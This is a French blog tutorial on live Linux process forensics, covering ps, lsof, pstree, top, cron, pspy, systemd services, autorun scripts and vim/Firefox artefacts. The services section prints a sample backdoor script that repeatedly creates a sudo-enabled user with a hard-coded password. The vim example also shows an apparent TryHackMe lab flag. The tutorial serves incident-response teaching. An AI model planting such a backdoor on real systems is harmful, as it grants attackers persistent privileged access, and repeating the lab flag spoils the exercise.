+++
author = "Enzo"
title = "Linux - Analyse de Processus"
date = "2025-12-07"
categories = [
    "Linux"
]
tags = [
    "Linux",
    "Forensic",
    "Processus"
]
+++



## Introduction
Dans une analyse à chaud (directement sur le système), il est important d'avoir les repertoires suivants "propre", pour être sur que les binaires ne soit pas compromis, et fournir de vraie preuve. 
 - `bin`
 - `sbin` 
 - `lib`
 - `lib64`

Pour ça il nous faut intégrer des binaires "propre", qui viennent d'une installation neuve. Voici comment les importer dans notre machine : 
```Bash
export PATH=/mnt/usb/bin:/mnt/usb/sbin
export LD_LIBRARY_PATH=/mnt/usb/lib:/mnt/usb/lib64
```

## Processus 
Un processus est un instance en cours d'exécution. Chaque processus possède un PID (Process ID) unique, cela permet au système de le gérer et de le suivre.

Les processus peuvent avoir une relation parent-enfant, le parent appel l'enfant. Ils seront "attaché" l'un à l'autre (nous pourrons voir quel est le parent du processus enfant, et quel processus à appeler le parent). 

Nous avons plusieurs utilitaire qui peuvent être utilisé pour voir les processus en cours d'exécution :

### PS
La commande `ps` nous donne cet output : 
![[Pasted image 20251006130135.png]]
Où : 
 - `PID` : Un identifiant unique pour chaque processus
 - `TTY` : Le terminal associé au processus
 - `TIME` : Temps utilisé par le processus 
 - `CMD` : Commande associé au processus

Il est également possible d'associé un utilisateur à la commande ps (pour voir quel processus est relié à quel utilisateur) : 
![ps -u investigator](Pasted-image-20251006130454.png)

### LSOF
`LSOF` permet de voir les fichiers ouvert par les processus système, nous pouvons associé un PID à `lsof` pour voir quel fichier/commande à été ouvert/lancé avec le processus voulu. 

Exemple d'utilisation : 
```Bash
lsof -p <PID>
```


### PSTREE
Cet utilitaire nous permet de lister les processus sous forme d'arborescence, ce qui permet de voir rapidement les relations parent-enfant. 

Exemple d'utilisation : 
```Bash
pstree -s -p <PID>
```
 - `-s` : lister les processus parent
 - `-p` : donne le PID

### TOP
Le problème des outils ci-dessus est qu'ils sont statique, ce qui permet de voir dynamiquement (et surtout en direct) les processus en cours d'execution sur la machine. Il nous donne également un plus d'information par rapport à l'utilisation du CPU et de la MEMOIRE. 

Exemple d'utilisation : 
```Bash
top -d 5 -u <user> -c
```
 - `-d` : mise à jour dynamique toutes les 5 secondes
 - `-u` : définit un utilisateurs (pas obligatoire)
 - `-c` : donne le chemin complet des commande (avec le /bin/bash)

## Cronjobs
Cron est un outil qui permet de lancé automatiquement des processus à des moments spécifique, soit sous forme de "boucle" (toutes les secondes, minutes, heures, jours, mois ...) soit à chaque redémarrage ... 

Le fichier principal de cron se situe dans `/etc/crontab` mais il existe un repertoire qui nous donne chaque tâche par utilisateur : `/var/spool/cron/crontabs` 

```txt
Voila la nomenclature du fichier cron
M | H | Jour du Mois | Mois | Jour de la Semaine | Commande

10  05        *          *            *           /home/bob/backup_tmp.sh

Dans cet exemple tout les jours à 5:10 la tâche Backup_tmp.sh se lancera
```

Toute les tâches effectué par cron sont logué dans `syslog` nous pouvons exécuter cette commande pour voir les log lié à cron : 
```Bash
sudo grep cron /var/log/syslog

# Pour voir les tâches lié à un utilisateur
sudo grep cron /var/log/syslog | grep -i '<utilisateur>'
```

### PSPY

Pspy est un outil open source permettant de surveiller en temps réel les processus Linux sans privilèges root. Il lit directement les données du système virtuel **/proc** pour afficher des informations comme les commandes exécutées, les PID, PPID, utilisateurs et horodatages.  
Utile pour l’énumération et la réponse à incident, il permet d’identifier les processus éphémères et de suivre l’exécution de tâches **cron**, offrant ainsi une meilleure visibilité sur l’activité du système.

Exemple d'utilisation : 
```Bash
pspy64
```

## Services 
Pour le recensement des service nous utilisons la commande `systemctl`, voici avec quel argument utiliser la commande : 
 - `status` : Donne le status du service
 - `start` : Démarre le service
 - `stop` : Stop le service
 - `enable` : Démarre le service à chaque démarrage de la machine  
 - `disable` : Effet inverse de la commande enable

Avec la commande `status` nous avons cette output :
```Bash
systemctl status b4ckd00rftw.service
b4ckd00rftw.service - Backdoor Service
     Loaded: loaded (/etc/systemd/system/b4ckd00rftw.service; enabled; vendor preset: enabled)
     Active: active (running) since Wed 2024-03-13 18:38:06 UTC; 1h 20min ago
   Main PID: 596 (b4ckd00rftw.sh)
      Tasks: 2 (limit: 1126)
     Memory: 6.4M
     CGroup: /system.slice/b4ckd00rftw.service
             ├─ 596 /bin/bash /usr/local/bin/b4ckd00rftw.sh
             ├─4067 sleep 60
```

Pour voir la configuration du service nous avons le chemin du fichier de conf :
```Bash
cat /usr/local/bin/b4ckd00rftw.sh
#!/bin/bash

while true; do
    sudo useradd -m -p $(openssl passwd -1 Password123!) b4ckd00rftw
    sudo usermod -aG sudo b4ckd00rftw
    sleep 60
done
```

Les service nous donnes également des logs : 
```Bash
journalctl -f -u b4ckd00rftw.service
```

## Autorun Script

### Script système
Script exécuté avant que l'utilisateur se connecte. Ils se trouvent généralement dans : 
 - `/etc/init.d/`
 - `/etc/rc.d/`
 - `/etc/systemd/system/`

### Script utilisateur
Script exécuté quand l'utilisateur se connecte. Ils se trouvent généralement dans : 
 - `~/.config/autostart/`
 - `~/.config/`

S'il y a beaucoup d'utilisateur nous pouvons utiliser cette commande : 
`ls -a /home/*/.config/autostart` pour voir les scripts qui se lance. 

## Artefact d'application
`dpkg -l` pour voir les application installé. 

### Vim
Vim peut être très intéressant pour les artefact qu'il génère, grâce à son fichier caché `.viminfo` il peut révéler plusieurs changement fait dans des fichiers ouvert avec `vim`.
```Bash
$ cat /home/janice/.viminfo

# Last Search Pattern:
~MSle0~/THM{4a8fd984228d89999342d189e6b916de}

# Command Line History (newest to oldest):
:q
|2,0,1710339077,,"q"

# Search String History (newest to oldest):
?/THM{4a8fd984228d89999342d189e6b916de}
|2,1,1710339063,47,"THM{4a8fd984228d89999342d189e6b916de}"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:

# File marks:
'0  1  0  /tmp/exfil.txt
|4,48,1,0,1710339077,"/tmp/exfil.txt"

# Jumplist (newest first):
-'  1  0  /tmp/exfil.txt
|4,39,1,0,1710339077,"/tmp/exfil.txt"

# History of marks within files (newest to oldest):

> /tmp/exfil.txt
        *       1710339075      0
        "       1       0
```

### Firefox
Tout comme Vim, Firefox nous génère beaucoup d'artefact. Grâce à un outil (dumpzilla), nous pouvons récupérer énormément de donnés.
``` Bash
$ sudo python3 /home/investigator/dumpzilla.py /home/eduardo/.mozilla/firefox/niijyovp.default-release -h
usage: python dumpzilla.py PROFILE_DIR [OPTIONS]

Options:

 --Addons
 --Search
 --Bookmarks [-bm_create_range <start> <end>][-bm_last_range <start> <end>]
 --Certoverride
 --Cookies [-showdom] [-domain <string>] [-name <string>] [-hostcookie <string>] [-access <date>] [-create <date>]
           [-secure <0|1>] [-httponly <0|1>] [-last_range <start> <end>] [-create_range <start> <end>]
 --Downloads [-range <start> <end>]
 --Export <directory> (export data as json)
 --Forms [-value <string>] [-forms_range <start> <end>]
 --Help (shows this help message and exit)
 --History [-url <string>] [-title <string>] [-date <date>] [-history_range <start> <end>] [-frequency]
 --Keypinning [-entry_type <HPKP|HSTS>]
 --OfflineCache [-cache_range <start> <end> -extract <directory>]
 --Preferences
 --Passwords
 --Permissions [-host <string>] [-modif <date>] [-modif_range <start> <end>]
 --RegExp (use Regular Expresions for string type filters instead of Wildcards)
 --Session
 --Summary (no data extraction, only summary report)
 --Thumbnails [-extract_thumb <directory>]
 --Verbosity (DEBUG|INFO|WARNING|ERROR|CRITICAL)
 --Watch [-text <string>] (shows in daemon mode the URLs and text form in real time; Unix only)

Wildcards (without RegExp option):

 '%'  Any string of any length (including zero length)
 '_'  Single character
 '\'  Escape character

Regular Expresions: https://docs.python.org/3/library/re.html

Date syntax:

 YYYY-MM-DD hh:mi:ss (wildcards allowed)

Profile location:

 WinXP profile -> 'C:\Documents and Settings\%USERNAME%\Application Data\Mozilla\Firefox\Profiles\xxxx.default'
 Win7 profile  -> 'C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles\xxxx.default'
 MacOS profile -> '/Users/$USER/Library/Application\ Support/Firefox/Profiles/xxxx.default'
 Unix profile  -> '/home/$USER/.mozilla/firefox/xxxx.default'
   
dumpzilla.py: error: ambiguous option: -h could match -hostcookie, -httponly, -host, -history_range
```
